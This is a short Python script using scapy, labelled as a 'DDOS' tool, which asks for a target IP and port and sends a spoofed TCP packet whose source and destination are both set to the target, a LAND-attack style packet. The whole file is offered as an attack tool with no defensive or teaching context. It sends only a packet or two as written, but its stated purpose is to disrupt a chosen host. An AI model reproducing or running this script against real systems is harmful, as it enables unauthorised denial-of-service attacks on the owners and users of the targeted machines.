from scapy.all import send
from scapy.all import IP
from scapy.all import TCP
from scapy.all import *
from colorama import Fore

print(Fore.BLUE + open('banner.txt','r').read())

print(Fore.YELLOW + ' ')
ip = str(input('Enter Ip: '))
port = int(input('Enter Port: '))

print(Fore.GREEN + 'DDOS Starting.')

pack3=IP(dst=ip,src=ip)
pack4=TCP(dport=port,sport=port)
pack6 = pack3/pack4
send(pack6)
sr1(pack6)

